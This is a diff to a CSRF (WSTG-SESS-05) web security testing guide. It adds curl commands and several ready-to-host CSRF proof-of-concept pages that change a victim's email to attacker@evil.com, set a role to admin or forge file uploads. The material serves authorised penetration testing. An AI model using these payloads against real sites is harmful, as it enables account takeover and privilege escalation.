@@ -10,7 +10,9 @@ tech_stack: [html, javascript, cookies]
 cwe_ids: [CWE-352]
 chains_with: [wstg-inpv-02, wstg-athn-05]
 prerequisites: [wstg-sess-01]
-severity_boost: {}
+severity_boost:
+  wstg-inpv-02: "Stored XSS lets an attacker's script read the CSRF token in-origin and auto-submit forged requests, bypassing token-based CSRF defenses entirely (Critical)"
+  wstg-athn-05: "A CSRF-forced action combined with a vulnerable/long-lived 'remember me' token grants persistent access that survives logout or session expiry (High)"
 ---
 
 # wstg-sess-05
@@ -302,6 +304,114 @@ tester.generate_report()
 
 ---
 
+## Tools
+
+| Tool                    | Description               | Usage                                   |
+| ------------------------ | -------------------------- | ----------------------------------------- |
+| **Burp Suite**           | CSRF PoC generator         | Engagement tools > Generate CSRF PoC     |
+| **OWASP ZAP**            | Automated CSRF scanner     | Active scan flags missing anti-CSRF tokens|
+| **CSRFTester**           | OWASP standalone tool      | Record and replay CSRF requests          |
+| **Browser DevTools**     | Manual request replay      | Strip/tamper token, resend               |
+
+---
+
+## Example Commands/Payloads
+
+```bash
+# Baseline: capture a state-changing request with a valid session + token
+curl -s -b "session={session}" "https://{target}/settings" | grep -iE "csrf|_token|authenticity"
+
+# Attempt request with token stripped entirely
+curl -s -X POST "https://{target}/api/change-email" \
+    -b "session={session}" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "email=attacker@evil.com"
+
+# Attempt request using GET for a state-changing action (common CSRF gap)
+curl -s -b "session={session}" "https://{target}/api/change-email?email=attacker@evil.com"
+
+# Method-override bypass attempt
+curl -s -X POST "https://{target}/api/change-email" \
+    -b "session={session}" \
+    -H "X-HTTP-Method-Override: PUT" \
+    -d "email=attacker@evil.com"
+```
+
+Ready-to-submit CSRF PoC (auto-submitting form, host on attacker-controlled page):
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="csrf" action="https://{target}/api/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.com" />
+  </form>
+  <script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
+```
+
+JSON-body CSRF PoC via `fetch` (for endpoints that don't check Content-Type strictly):
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    fetch("https://{target}/api/change-email", {
+      method: "POST",
+      credentials: "include",
+      headers: { "Content-Type": "text/plain" },
+      body: JSON.stringify({ email: "attacker@evil.com" })
+    });
+  </script>
+</body>
+</html>
+```
+
+Exact-JSON CSRF via an `enctype="text/plain"` auto-submit form — crafts a real `{"role":admin,...}` body using the input's `name`/`value` as JSON fragments, so it works even when the endpoint requires `Content-Type: application/json`-shaped bodies but doesn't validate the header itself, and also bypasses browsers' simple-request CORS preflight:
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <form id="csrf_json" action="https://{target}/api/setrole" enctype="text/plain" method="POST">
+    <!-- sends: {"role":"admin", "other":"="} -->
+    <input type="hidden" name='{"role":"admin", "other":"' value='"}' />
+  </form>
+  <script>document.getElementById('csrf_json').submit();</script>
+</body>
+</html>
+```
+
+`multipart/form-data` file-upload CSRF (forges a file upload via `DataTransfer`, for endpoints that only accept multipart bodies):
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+  <form style="display:none" name="xss" method="post" action="https://{target}/api/upload" enctype="multipart/form-data">
+    <input id="file" type="file" name="file"/>
+  </form>
+  <script>
+    const dT = new DataTransfer();
+    const file = new File(["CSRF-filecontent"], "CSRF-filename");
+    dT.items.add(file);
+    document.xss.file.files = dT.files;
+    document.xss.submit();
+  </script>
+</body>
+</html>
+```
+
+No-interaction GET CSRF via hidden `<img>` (classic zero-click variant of the GET state-change gap above):
+
+```html
+<img src="https://{target}/api/change-email?email=attacker@evil.com" style="display:none" />
+```
+
+---
+
 ## Remediation Guide
 
 ### 1. Implement CSRF Tokens
@@ -359,6 +469,15 @@ def validate_origin():
 | CWE ID      | Title                             |
 | ----------- | --------------------------------- |
 | **CWE-352** | Cross-Site Request Forgery (CSRF) |
+
+---
+
+## References
+
+- [OWASP WSTG - Testing for CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
+- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [PortSwigger - CSRF](https://portswigger.net/web-security/csrf)
+- [PayloadsAllTheThings - Cross-Site Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery)
 
 
 ---
